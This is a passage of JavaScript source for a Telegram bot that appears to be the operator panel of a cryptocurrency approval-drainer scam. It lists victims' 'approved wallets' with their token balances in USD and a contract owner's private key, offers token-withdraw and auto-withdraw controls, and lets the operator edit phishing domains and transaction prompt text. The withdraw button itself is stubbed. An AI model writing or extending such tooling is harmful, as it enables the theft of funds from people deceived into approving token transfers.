          const amountInUsd = (userBalanceData.amountInUsd ?? 0);
          const ownerTrx = (ownerBalance ?? 0);
          const approvedAtStr = formatApprovedAt(refreshed.approvedAt);

          let text = `💼 <b>Wallet Details</b>\n\n`;
          text += `• Approval time: <code>${approvedAtStr}</code>\n`;
          text += `• User Address: <code>${refreshed.address}</code>\n`;
          text += `• Token Name: <code>${refreshed.tokenName}</code>\n`;
          text += `• Token Contract: <code>${refreshed.tokenContract}</code>\n`;
          text += `• Token Amount: <code>${quantity}</code>\n`;
          text += `• Token Balance In USD: <code>${amountInUsd} $</code>\n`;
          text += `• Contract Address: <code>${refreshed.contractAddress}</code>\n`;
          text += `• Contract Owner Address: <code>${refreshed.contractOwnerAddress}</code>\n`;
          text += `• Contract Owner Private Key: <code>${maskPrivateKey(refreshed.contractOwnerPrivateKey)}</code>\n`;
          text += `• Contract Owner Balance: <code>${ownerTrx} TRX</code>\n`;

          const reply_markup = {
            inline_keyboard: [
              [{ text: "♻️ Withdraw Tokens", callback_data: `withdraw_tokens_${refreshed.address}` }],
              [{ text: "❌ Remove Wallet", callback_data: `remove_wallet_${refreshed.address}` }],
              [{ text: "🔙 Back", callback_data: "back_wallets_list" }]
            ]
          };

          refreshed._lastBalance = userBalanceData || { balance: 0, quantity: 0, amountInUsd: 0 };

          editingState[userId] = { type: 'wallet', wallet: refreshed, chatId, messageId };

          await bot.editMessageText(text, { chat_id: chatId, message_id: messageId, reply_markup });
          return;
        } catch (err) {
          return bot.answerCallbackQuery(query.id, { text: "❌ Error returning to wallet", show_alert: true });
        }
      }

      if (data === "withdraw_tokens") {
        return bot.answerCallbackQuery(query.id, { text: "Feature not implemented yet", show_alert: true });
      }

      if (data.startsWith("remove_wallet_")) {
        const walletAddress = data.substring("remove_wallet_".length);
        const text = `⚠️ Are you sure you want to remove wallet <code>${walletAddress}</code>?`;
        const reply_markup = {
          inline_keyboard: [
            [
              { text: "✅ Yes", callback_data: `confirm_remove_${walletAddress}` },
              { text: "❌ No", callback_data: "back_wallets_list" }
            ]
          ]
        };
        await sendOrEdit(bot, { query }, text, { reply_markup });
        return;
      }

      if (data.startsWith("confirm_remove_")) {
        const walletAddress = data.substring("confirm_remove_".length);
        const raw = await fsp.readFile("./data/approved-wallets.json", "utf8");
        let wallets = JSON.parse(raw);
        wallets = wallets.filter(w => w.address !== walletAddress);
        await fsp.writeFile("./data/approved-wallets.json", JSON.stringify(wallets, null, 2));

        const text = `✅ Wallet <code>${walletAddress}</code> removed.`;
        if (wallets.length) {
          const buttons = wallets.map(w => ([{ text: w.address, callback_data: `wallet_${w.address}` }]));
          await sendOrEdit(bot, { query }, "✅ Approved wallets:", {
            reply_markup: { inline_keyboard: buttons }
          });
        } else {
          await sendOrEdit(bot, { query }, "ℹ️ No wallets approved yet.");
        }

        return;
      }

      if (data.startsWith("config_")) {
        const configId = data.split("_")[1];
        await showConfig(bot, { query, configId });
        return;
      }

      if (data.startsWith("editconfig_")) {
        const configId = data.split("_")[1];
        const cfg = getConfigById(configId);
        const forbidden = ["id", "transactionTitle", "transactionMessage"];
        const buttons = Object.keys(cfg)
          .filter(k => !forbidden.includes(k))
          .map(k => ([{ text: k, callback_data: `editparam_${cfg.id}_${k}` }]));

        buttons.push([{ text: "🔙 Back", callback_data: `config_${cfg.id}` }]);

        const reply_markup = { inline_keyboard: buttons };

        await sendOrEdit(bot, { query }, "Choose a parameter:", { reply_markup });
        return;
      }

      if (data.startsWith("editparam_")) {
        const [, configId, param] = data.split("_");
        const cfg = getConfigById(configId);

        if (param === "domains") {
          const reply_markup = {
            inline_keyboard: [
              [{ text: "➕ Add domain", callback_data: `domains_add_${configId}` }],
              [{ text: "➖ Remove domain", callback_data: `domains_remove_${configId}` }],
              [{ text: "🔙 Back", callback_data: `editconfig_${configId}` }],
            ],
          };
          await sendOrEdit(bot, { query }, `Manage <b>${param}</b>:`, { reply_markup });
        } else if (param === "useAutowithdraw") {
          const reply_markup = {
            inline_keyboard: [
              [{ text: "✅ Enable", callback_data: `setparam_${configId}_${param}_true` }],
              [{ text: "❌ Disable", callback_data: `setparam_${configId}_${param}_false` }],
              [{ text: "🔙 Back", callback_data: `editconfig_${configId}` }],
            ],
          };
          await sendOrEdit(bot, { query }, "Set AutoWithdraw:", { reply_markup });
        } else if (param === "mode") {
          const reply_markup = {
            inline_keyboard: [
              [1, 2, 3, 4].map(m => ({ text: `Mode ${m}`, callback_data: `setparam_${configId}_${param}_${m}` })),
              [{ text: "🔙 Back", callback_data: `editconfig_${configId}` }],
            ],
          };
          await sendOrEdit(bot, { query }, "Choose mode:", { reply_markup });
        } else {
          editingState[userId] = { type: 'config', configId, param };
          const current = cfg[param];
          const reply_markup = {
            inline_keyboard: [[{ text: "🔙 Back", callback_data: `editconfig_${configId}` }]]
          };
          await sendOrEdit(bot, { query }, `Current value of <b>${param}</b>: <code>${current}</code>\n\nEnter new value ${PARAM_HINTS[param] || ""}`, {
            reply_markup
          });
        }
        return;
      }

      if (data.startsWith("setparam_")) {
        const [, configId, param, rawVal] = data.split("_");
        const cfg = getConfigById(configId);

        const value = parseValue(param, rawVal);
        if (PARAM_RESTRICTIONS[param] && !PARAM_RESTRICTIONS[param](value)) {
          return bot.answerCallbackQuery(query.id, { text: "❌ Invalid value", show_alert: true });
        }

        cfg[param] = value;
        await saveConfig(configRoot);

        await sendOrEdit(bot, { query }, `✅ <b>${param}</b> updated to <code>${rawVal}</code>\n\n📄 Config updated below 👇`);
        await showConfig(bot, { query, configId: cfg.id });

        return;
      }

      if (data.startsWith("domains_add_")) {
        const configId = data.split("_")[2];
        getConfigById(configId);
        editingState[userId] = { type: 'config', configId, param: "domains_add" };
        const reply_markup = {
          inline_keyboard: [
            [{ text: "🔙 Back", callback_data: `editparam_${configId}_domains` }]
          ]
        };
        await sendOrEdit(bot, { query }, "Enter domain to add:", { reply_markup });
        return;
      }

      if (data.startsWith("domains_remove_") && !data.startsWith("domains_remove_sel_")) {
        const configId = data.split("_")[2];
        const cfg = getConfigById(configId);
        const buttons = cfg.domains.map((d, i) => ([{
          text: d,
          callback_data: `domains_remove_sel_${configId}_${i}`
        }])); 
        buttons.push([{ text: "🔙 Back", callback_data: `editparam_${configId}_domains` }]);

        await sendOrEdit(bot, { query }, "Select domain to remove:", {
          reply_markup: { inline_keyboard: buttons },
        });
        return;
      }

      if (data.startsWith("domains_remove_sel_")) {
        const parts = data.split("_");
        const configId = parts[3];
        const idx = parts[4];
        const cfg = getConfigById(configId);
        const [removed] = cfg.domains.splice(Number(idx), 1);
        await saveConfig(configRoot);

        await sendOrEdit(bot, { query }, `✅ Domain removed: <code>${removed}</code>\n\n📄 Config updated below 👇`);
        await showConfig(bot, { query, configId: cfg.id });
        return;
      }

      if (data === "back_mainmenu") {
        const reply_markup = {
          inline_keyboard: configRoot.SETTINGS.map(c => ([{ text: `🔘 Config №${c.id}`, callback_data: `config_${c.id}` }]))
        };
        await sendOrEdit(bot, { query }, "⚙️ Select config:", { reply_markup });
        return;
      }

    } catch (err) {
      try {
        await bot.answerCallbackQuery(query.id, { text: "❌ Error: " + err.message, show_alert: true });
      } catch (e) { }
    }
  });

  return bot;
}

const bot = createBot();
module.exports = bot;
